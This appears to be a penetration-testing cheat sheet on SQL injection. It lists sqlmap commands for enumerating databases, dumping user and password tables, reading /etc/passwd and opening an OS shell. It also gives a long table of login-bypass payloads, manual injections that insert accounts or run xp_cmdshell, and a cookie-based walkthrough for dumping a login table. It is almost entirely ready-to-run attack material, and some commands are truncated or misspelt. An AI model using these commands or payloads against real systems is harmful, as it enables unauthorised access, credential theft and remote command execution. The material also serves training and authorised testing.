# SQL Injection

## Sqlmap Examples

| Task | Command |
| :--- | :--- |
| Vulnerable Site | [http://www.site.com/section.php?id=51](http://www.site.com/section.php?id=51) |
| Initial Test | [http://www.site.com/section.php?id=51](http://www.site.com/section.php?id=51)' |
| SQLMap POST parameter Scan: | sqlmap.py -u [http://host/u.php](http://host/u.php) --data="id=u1" |
| SQLMap Discover Databases: | sqlmap.py -u [http://www.sitemap.com/section.php?id=51](http://www.sitemap.com/section.php?id=51)' --dbs |
| SQLMap find tables in Database: | sqlmap.py -u [http://www.site.com/section.php?id=51](http://www.site.com/section.php?id=51)' --tables -D safecosmetics |
| SQLMap get columns in a table: | sqlmap.py -u [http://www.site.com/section.php?id=51](http://www.site.com/section.php?id=51)' --columns -D safecosmetics -T users |
| SQLMap get data from a table: | sqlmap.py -u [http://www.site.com/section.php?id=51](http://www.site.com/section.php?id=51)' --dump -D safecosmetics -T users sqlmap.py -u [http://www.site.com/section.php?id=51](http://www.site.com/section.php?id=51)' --dump -D |
| SQLMap get shell access: | sqlmap.py -u [http://www.site.com/section.php?id=51](http://www.site.com/section.php?id=51)' --os-shell |
| SQLMap: Fetch the list of users and roles: | qlmap.py -u "[http://localhost/weak.php?id=10](http://localhost/weak.php?id=10)" --users --passwords --privileges --roles --threads=10 sqlmap -u [http://vulnscripts/sqli.php?name=a](http://vulnscripts/sqli.php?name=a) --users --passwords --privileges --roles --threads=10 |
| SQLMap getting the current user, current database and hostname information: | sqlmap.py -u [http://localhost/weak.php?id=10](http://localhost/weak.php?id=10)' --current-user --is-dba --current-db -hostn |
| SQLMap Read file: | sqlmap.py -u [http://localhost/weak.php?id=10](http://localhost/weak.php?id=10)' --file-read=/etc/passwd --threads=10 |
| SQLMap - Log the details: | sqlmap -l /tmp/burp\_log.log --scope="site.org" |
| SQLMap - Add custom prefix: | sqlmap -u [http://receipt.sec642.org/receipt.php?id=mmo\_1](http://receipt.sec642.org/receipt.php?id=mmo_1) --prefix='"' |
| SQLMap Exploitation Steps: Test to see if input is vulnerable | sqlmap -u [http://vulnscripts/sqli.php?name=a](http://vulnscripts/sqli.php?name=a) |
| SQLMap Exploitation Steps: With -b argument sqlmap can get the version information of the database. | sqlmap -u [http://vulnscripts/sqli.php?name=a](http://vulnscripts/sqli.php?name=a) -b |
| To see the current user, current database and hostname information we can use following command: | sqlmap -u [http://vulnscripts/sqli.php?name=a](http://vulnscripts/sqli.php?name=a) --current-user --is-dba --current-db --hostname --threads=10 |
| You can use sqlmap to get the shell from the target system using '--os-shell' option or can execute a system command using '--os-cmd=OSCM' | sqlmap -u [http://vulnscripts/sqli.php?name=a](http://vulnscripts/sqli.php?name=a) --os-shell |
| Scan url for union + error based injection with mysql backend and use a random user agent + database dump: | sqlmap -u "[http://meh.com/meh.php?id=1](http://meh.com/meh.php?id=1)" --dbms=mysql --tech=U --random-agent --dump |
| Sqlmap check form for injection: | sqlmap -o -u "[http://meh.com/form/](http://meh.com/form/)" --forms |
| Retrieve current user, database, and whether user is an admin: | sqlmap.py -u [http://host/u.php?id=u1](http://host/u.php?id=u1) --current-user --current-db --is-dba |

## SQLI Example Payloads

| Command | Command | Command | Command |
| :--- | :--- | :--- | :--- |
| '-' | ' ' | '&' | '^' |
| '\*' | ' or ''-' | ' or '' ' | ' or ''&' |
| ' or ''^' | ' or ''\*' | "-" | " " |
| "&" | "^" | "\*" | " or ""-" |
| " or "" " | " or ""&" | " or ""^" | " or ""\*" |
| or true-- | " or true-- | ' or true-- | "\) or true-- |
| '\) or true-- | ' or 'x'='x | '\) or \('x'\)=\('x | '\)\) or \(\('x'\)\)=\(\('x |
| " or "x"="x | "\) or \("x"\)=\("x | "\)\) or \(\("x"\)\)=\(\("x | ' or 1=1 -- |
| or 1=1 | or 1=1-- | or 1=1\# | or 1=1/\* |
| admin' -- | admin' \# | admin'/\* | admin' or '1'='1 |
| admin' or '1'='1'-- | admin' or '1'='1'\# | admin' or '1'='1'/\* | admin'or 1=1 or ''=' |
| admin' or 1=1 | admin' or 1=1-- | admin' or 1=1\# | admin' or 1=1/\* |
| admin'\) or \('1'='1 | admin'\) or \('1'='1'-- | admin'\) or \('1'='1'\# | admin'\) or \('1'='1'/\* |
| admin'\) or '1'='1 | admin'\) or '1'='1'-- | admin'\) or '1'='1'\# | admin'\) or '1'='1'/\* |
| 1234 ' AND 1=0 UNION ALL SELECT 'admin' | admin" -- | admin" \# | admin"/\* |
| admin" or "1"="1 | admin" or "1"="1"-- | admin" or "1"="1"\# | admin" or "1"="1"/\* |
| admin"or 1=1 or ""=" | admin" or 1=1 | admin" or 1=1-- | admin" or 1=1\# |
| admin" or 1=1/\* | admin"\) or \("1"="1 | admin"\) or \("1"="1"-- | admin"\) or \("1"="1"\# |
| admin"\) or \("1"="1"/\* | admin"\) or "1"="1 | admin"\) or "1"="1"-- | admin"\) or "1"="1"\# |
| admin"\) or "1"="1"/\* |  |  |  |

## More sqli Examples

Manual SQLI:

```text
blah' or 1=1 -- in the Username field
blah';insert into login values ('john','apple123'); -- in the Username
blah';create database mydatabase; -- in the Username field
blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; -- in the Username field
```

Sqlmap:

```text
Grab cookie with Inspect Element (right click webpage)
sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=<”cookie value which you have copied in step #5”> --dbs
sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=<”same as above”> -D moviescope --tables
sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=<”same as above”> -D moviescope -T User_Login --columns
sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=<”same as above”> -D moviescope -T User_Login --dump
sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=<”same as above”> --os-shell
```

